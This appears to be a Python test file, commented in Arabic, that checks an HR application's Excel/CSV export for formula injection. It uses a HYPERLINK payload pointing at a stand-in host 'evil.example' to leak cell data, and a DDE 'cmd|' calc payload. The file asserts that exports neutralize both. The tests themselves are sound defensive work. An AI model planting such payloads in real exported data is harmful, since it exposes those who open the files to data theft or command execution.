# -*- coding: utf-8 -*-
"""تصديرُ Excel/CSV لا يحمل صيغةً كتبها مستخدم — حقنُ الصيغ (OWASP).

**القياس**: ``exports.py`` يكتب القيمَ كما هي. و``openpyxl`` يكتب كلَّ نصٍّ
يبدأ بـ``=`` **صيغةً** تُنفَّذ عند الفتح. والأسماءُ والمسمّياتُ يكتبها مستخدمون،
والتصديرُ يفتحه من يملك صلاحيةً أعلى: ``=HYPERLINK("http://…")`` يسرّب
بالنقر، و``=cmd|…`` في CSV يُشغّل أمرًا في إصدارات Excel القديمة.

فصار ``exports.neutralize`` يسبق ما يبدأ بـ``= @ + - \\t \\r`` بفاصلةٍ عليا
(ويترك الأرقامَ والهواتف)، و``to_xlsx`` يُثبّت كلَّ نصٍّ نصًّا. وكلُّ تصديرٍ
في النظام يمرّ بالوحدة نفسها.
"""
from __future__ import annotations

import io

import openpyxl
from sqlalchemy import select

from app import models
from app.database import SessionLocal
from app.exports import neutralize, to_csv
from tests.conftest import auth_headers, login

_EVIL = '=HYPERLINK("http://evil.example/?d="&A1,"انقر")'


def test_an_exported_employee_name_is_not_a_formula(client):
    db = SessionLocal()
    try:
        e = db.scalar(select(models.Employee).where(
            models.Employee.company_id == 1, models.Employee.status == "active"))
        eid, old = e.id, e.name
        e.name = _EVIL
        db.commit()
    finally:
        db.close()
    try:
        r = client.get("/api/reports/employees", params={"fmt": "xlsx", "company_id": 1},
                       headers=auth_headers(login(client, "000000000000", "admin123")))
        assert r.status_code == 200, r.text[:200]
        ws = openpyxl.load_workbook(io.BytesIO(r.content)).active
        formulas = [c.coordinate for row in ws.iter_rows() for c in row if c.data_type == "f"]
        assert not formulas, f"خلايا صيغٍ في التصدير: {formulas}"
        values = [c.value for row in ws.iter_rows() for c in row]
        assert "'" + _EVIL in values, "القيمةُ لم تُحيَّد أو لم تُصدَّر"
    finally:
        db = SessionLocal()
        try:
            db.get(models.Employee, eid).name = old
            db.commit()
        finally:
            db.close()


def test_csv_neutralizes_and_keeps_numbers():
    body = to_csv(["x"], [["=1+1"], ["+96512345678"], [-5], ["@x"]]).decode("utf-8")
    assert "'=1+1" in body and "'@x" in body
    assert "+96512345678" in body and "'+965" not in body


def test_neutralize_leaves_ordinary_text_alone():
    assert neutralize("أحمد العلي") == "أحمد العلي"
    assert neutralize("-5") == "-5"
    assert neutralize("+cmd|' /C calc'!A0").startswith("'")


def test_every_export_goes_through_the_one_module():
    import pathlib
    import re

    app_dir = pathlib.Path(__file__).resolve().parents[1] / "app"
    stray = [p.name for p in app_dir.rglob("*.py") if p.name != "exports.py"
             and re.search(r"csv\.writer|Workbook\(\)", p.read_text(encoding="utf-8", errors="ignore"))]
    assert not stray, f"تصديرٌ يتخطّى التحييد: {stray}"
